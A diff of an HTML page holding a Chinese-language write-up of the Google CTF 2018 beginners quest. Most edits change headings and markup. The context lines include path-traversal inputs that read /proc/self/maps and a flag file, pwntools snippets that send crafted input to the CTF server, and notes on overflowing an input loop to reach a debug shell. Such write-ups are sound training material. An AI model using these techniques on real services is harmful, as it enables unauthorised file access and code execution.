@@ -11,15 +11,16 @@
   <body>
   <div style="padding:1% 5% 1% 5%">
     <section style="padding-top: 20px; padding-bottom: 5px; color: #fff; text-align: center; background-image: linear-gradient(120deg, #224a73, #0d4027);">
-      <h1 style="font-size: 2.25rem;"> Google CTF beginners quest writeup </h1>
-      <h3 style="font-weight: normal; opacity: 0.7; font-size: 1.15rem;"> 2018-12-28 by bugnofree </h3>
+      <div id = "headtitle"> Google CTF beginners quest writeup </div>
+      <div id = "headinfo"> by bugnofree </div>
+      <div id = "lastupdate"> Publish → 2018-12-28 Update → 2019-01-05</div>
     </section>
     
-<h2>letter</h2>
+<h1> letter</h1>
 <p>下载后是个 PDF 文件, 打开后, &nbsp;<code class="language-clike">ctrl+a</code>&nbsp; 全选复制, 然后粘贴到文本编辑器里就得到了flag. 如下图所示, 注意高亮要选中 Password 所在的黑条块.</p>
 <p><img src="images/letter.png"/></p>
 <p>flag 是 &nbsp;<code class="language-clike">CTF{ICanReadDis}</code>&nbsp;.</p>
-<h2>moar</h2>
+<h1> moar</h1>
 <p>man 手册里面按下 h 可以看到 man 的操作选项, 如下:</p>
 <pre><code class="language-clike"> -&lt;flag&gt;              Toggle a command line option [see OPTIONS below].
  --&lt;name&gt;             Toggle a command line option, by name.
@@ -58,7 +59,7 @@ echo &#39;Disabling DMZ using password CTF{SOmething-CATastr0phic}&#39;
 echo CTF{SOmething-CATastr0phic} &gt; /dev/dmz
 </code></pre>
 <p>flag 是 &nbsp;<code class="language-clike">CTF{SOmething-CATastr0phic}</code>&nbsp;</p>
-<h2>Admin UI</h2>
+<h1> Admin UI</h1>
 <pre><code class="language-clike">➜  google-ctf nc mngmnt-iface.ctfcompetition.com 1337
 === Management Interface ===
  1) Service access
@@ -67,7 +68,7 @@ echo CTF{SOmething-CATastr0phic} &gt; /dev/dmz
 </code></pre>
 <p>我只想到了看 1), 密码不知道, 没有思路了.</p>
 <p>看了别人的 writeup, 才看到人家 <a href="https://ctftime.org/writeup/10289">https://ctftime.org/writeup/1028...</a> 看了 2),我却没有继续看 2). 这是一个很不好的地方, 因此我打算看下 2) 怎么做,2) 获取的信息如下</p>
-<ul><li>显示了两个版本发行日志<ul><li>0.2 版本更新了库, 修复路径遍历 bug.<li>0.3 版本因为未知原因回滚 0.2.</li></li></ul></li></ul>
+<ul><li>显示了两个版本发行日志<ul><li>0.2 版本更新了库, 修复路径遍历 bug.</li><li>0.3 版本因为未知原因回滚 0.2.</li></ul></li></ul>
 <p>看到这里我又没有思路了, 之后上述 wirteup 里面直接提到了路径遍历,我根本不知道这是如何得到的, 这个 wirteup <a href="https://ctftime.org/task/6252">https://ctftime.org/task/6252</a> 提到了,说是在 2) 中选择版本的时候, 随便输入一个错误的值, 导致爆出如下错误:</p>
 <pre><code class="language-clike">Error: No such file or directory
 </code></pre>
@@ -157,7 +158,7 @@ with open(&#39;adminui.elf&#39;, &#39;wb&#39;) as _:
     _.write(exe)
 </code></pre>
 <p>&nbsp;<code class="language-clike">can_recv</code>&nbsp; 里面可以设置一个超时, 这里设置为 2s, 如果网络环境差, 可以适当设置大一点.这样 dump 出来的程序是完整的. 然后用 radare2 分析, 使用 BB 模式分析.</p>
-<h3>adminui</h3>
+<h2> adminui</h2>
 <p>第一个主要的分析的函数是 primary_login, 这个对应于 adminui-1 的任务.</p>
 <p>我们能看到它读取了当前路径下的 flag 文件, 那么去哪里找 flag 文件呢?通过查看 ../../../proc/self/maps 也能够得到主程序的具体路径:</p>
 <pre><code class="language-clike">00400000-00401000 r-xp 00000000 08:01 534875                             /home/user/main
@@ -167,7 +168,7 @@ with open(&#39;adminui.elf&#39;, &#39;wb&#39;) as _:
 <p>所以 flag 文件的路径是 ../../../home/user/flag</p>
 <pre><code class="language-clike">CTF{I_luv_buggy_sOFtware}
 </code></pre>
-<h3>adminui 2</h3>
+<h2> adminui 2</h2>
 <p>第二个函数 secondary_login, 这个对应于 adminui-2 的任务.</p>
 <pre><code class="language-clike">:&gt; pcj 0x23 @ 0x41414a40
 [132,147,129,188,147,176,168,152,151,166,180,148,176,168,181,131,189,152,133,162,179,179,162,181,152,179,175,243,169,152,246,152,172,248,186]
@@ -191,7 +192,7 @@ conn.sendline(&#39;A&#39; * 0x23)
 conn.interactive(prompt = &#39;&#39;)
 </code></pre>
 <p>这里就走到了 command_line 函数, 可以输入 shell 来进入一个终端,但是这个终端在程序里面被禁用了. 这就是 adminui-3 的任务.</p>
-<h3>adminui 3</h3>
+<h2> adminui 3</h2>
 <p>adminui-3 我不知道怎么处理, 进入 debug_shell 函数由一个 shell_enabled 变量决定, 而该变量默认是 flase. 这里面处理输入的函数是 getsx_char,这个函数没有设定输入的长度, 每次用 fread 读一个字节, 然后放入 result 中.来看一下主要的循环汇编代码</p>
 <pre><code class="language-clike">; var char *result_ @ rbp-0x18
 ; var char buf_ @ rbp-0x1
@@ -335,14 +336,14 @@ CTF{c0d3ExEc?W411_pL4y3d}
 [*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
 </code></pre>
 <p>所以 flag 为 &nbsp;<code class="language-clike">CTF{c0d3ExEc?W411_pL4y3d}</code>&nbsp;.</p>
-<h3>后记</h3>
+<h2> 后记</h2>
 <p>最开始尝试的是用 rop 的方法来直接调用 system 系统调用, 但是尴尬的是 system 的地址如下</p>
 <pre><code class="language-clike">[0x4141428e]&gt; ?v sym.imp.system
 0x400ae0
 </code></pre>
 <p>发送 rop 上去一直不成功, 后来在群里问了问, r3kapig 的 pxx 大哥告诉我里面的 0xa 是回车,恍然大悟.</p>
 <p>然后又看了一下, 不用 rop 这么麻烦, 直接把 debug_shell 的地址写进去就行了.</p>
-<h2>FILTER ENV</h2>
+<h1> FILTER ENV</h1>
 <p>TODO</p>
 
     <script src="../pigger/js/prism.js"></script>
